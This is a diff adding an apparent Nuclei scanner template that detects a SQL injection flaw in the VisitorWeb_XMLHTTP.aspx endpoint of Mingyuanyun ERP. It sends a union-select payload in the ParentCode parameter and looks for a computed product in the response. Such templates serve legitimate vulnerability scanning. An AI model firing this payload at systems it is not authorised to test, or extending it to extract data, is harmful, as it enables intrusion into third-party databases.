@@ -1,0 +1,26 @@
+id: mingyuanyun-erp-visitorweb-xmlhttp-aspx-sqli
+info:
+  name: 明源云ERP VisitorWeb_XMLHTTP.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 明源云ERP
+
+variables:
+  t1: "{{rand_int(1000000, 9000000)}}"
+  t2: "{{rand_int(1000000, 8000000)}}"
+
+http:
+  - method: GET
+    path:
+      - "/CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+sum({{t1}}*{{t2}})--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(t1)*to_number(t2)}}"
+        part: body
